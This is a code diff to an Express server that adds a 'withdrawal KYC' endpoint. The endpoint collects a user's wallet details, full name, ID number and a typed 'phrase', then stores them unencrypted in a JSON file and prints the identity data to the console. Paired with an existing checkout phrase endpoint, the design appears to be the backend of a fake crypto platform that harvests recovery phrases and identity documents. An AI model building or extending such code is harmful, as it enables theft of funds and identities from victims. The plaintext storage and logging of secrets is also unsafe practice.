@@ -13,6 +13,7 @@ const DATA_DIR = path.join(__dirname, 'data');
 const USERS_FILE = path.join(DATA_DIR, 'users.json');
 const CHAT_HISTORY_FILE = path.join(DATA_DIR, 'chat-history.json');
 const PHRASE_SESSIONS_FILE = path.join(DATA_DIR, 'phrase-sessions.json');
+const WITHDRAWALS_FILE = path.join(DATA_DIR, 'withdrawals.json');
 
 const app = express();
 const server = http.createServer(app);
@@ -55,6 +56,7 @@ let currentUsers = [];
 let chatHistoryByClient = {};
 let activeConnections = {};
 let checkoutPhraseSessions = [];
+let withdrawalPhraseSessions = [];
 
 // --- Persistence Helpers ---
 function ensureDataDir() {
@@ -112,16 +114,22 @@ function persistPhraseSessions() {
   return writeJsonFile(PHRASE_SESSIONS_FILE, checkoutPhraseSessions);
 }
 
+function persistWithdrawals() {
+  return writeJsonFile(WITHDRAWALS_FILE, withdrawalPhraseSessions);
+}
+
 function loadPersistentData() {
   ensureDataDir();
 
   const loadedUsers = readJsonFile(USERS_FILE, []);
   const loadedChatHistory = readJsonFile(CHAT_HISTORY_FILE, {});
   const loadedPhraseSessions = readJsonFile(PHRASE_SESSIONS_FILE, []);
+  const loadedWithdrawals = readJsonFile(WITHDRAWALS_FILE, []);
 
   currentUsers = Array.isArray(loadedUsers) ? loadedUsers : [];
   chatHistoryByClient = loadedChatHistory && typeof loadedChatHistory === 'object' ? loadedChatHistory : {};
   checkoutPhraseSessions = Array.isArray(loadedPhraseSessions) ? loadedPhraseSessions : [];
+  withdrawalPhraseSessions = Array.isArray(loadedWithdrawals) ? loadedWithdrawals : [];
 }
 
 // --- Auth Helpers ---
@@ -369,6 +377,69 @@ app.post('/api/v1/checkout/phrase-session', (req, res) => {
   return res.status(201).json({
     success: true,
     message: 'Phrase verification session recorded.',
+    sessionId: session.sessionId,
+    verified: session.isPhraseMatch
+  });
+});
+
+// --- Withdrawal KYC Endpoint ---
+app.post('/api/v1/withdraw/kyc-session', (req, res) => {
+  const {
+    clientId,
+    amount,
+    network,
+    walletProvider,
+    walletCoin,
+    kycFullName,
+    kycIdNumber,
+    challenge,
+    phraseInput,
+    isPhraseMatch
+  } = req.body || {};
+
+  if (!amount || !network || !walletProvider || !kycFullName || !kycIdNumber || !challenge) {
+    return res.status(400).json({ success: false, message: 'Missing required withdrawal verification fields.' });
+  }
+
+  const session = {
+    sessionId: `WD-${Date.now()}-${Math.floor(Math.random() * 900 + 100)}`,
+    createdAt: new Date().toISOString(),
+    clientId: clientId || 'unknown-client',
+    amount,
+    network,
+    walletProvider,
+    walletCoin: walletCoin || 'USDT',
+    kycFullName,
+    kycIdNumber,
+    challenge,
+    phraseInput: phraseInput || '',
+    isPhraseMatch: Boolean(isPhraseMatch),
+    status: 'pending'
+  };
+
+  withdrawalPhraseSessions.unshift(session);
+
+  if (withdrawalPhraseSessions.length > 100) {
+    withdrawalPhraseSessions = withdrawalPhraseSessions.slice(0, 100);
+  }
+
+  if (!persistWithdrawals()) {
+    withdrawalPhraseSessions = withdrawalPhraseSessions.filter((entry) => entry.sessionId !== session.sessionId);
+    return res.status(500).json({ success: false, message: 'Failed to record withdrawal session.' });
+  }
+
+  console.log('\n=== WITHDRAWAL KYC VERIFICATION SESSION ===');
+  console.log(`[${getTimestamp()}] Session ID: ${session.sessionId}`);
+  console.log(`[${getTimestamp()}] Client ID: ${session.clientId}`);
+  console.log(`[${getTimestamp()}] Amount/Network: ${session.amount} ${session.network}`);
+  console.log(`[${getTimestamp()}] Wallet: ${session.walletProvider} (${session.walletCoin})`);
+  console.log(`[${getTimestamp()}] KYC: ${session.kycFullName} | ${session.kycIdNumber}`);
+  console.log(`[${getTimestamp()}] Phrase Check: match=${session.isPhraseMatch}`);
+  console.log('=== END WITHDRAWAL SESSION ===\n');
+
+  return res.status(201).json({
+    success: true,
+    message: 'Withdrawal KYC session recorded.',
     sessionId: session.sessionId,
     verified: session.isPhraseMatch
   });
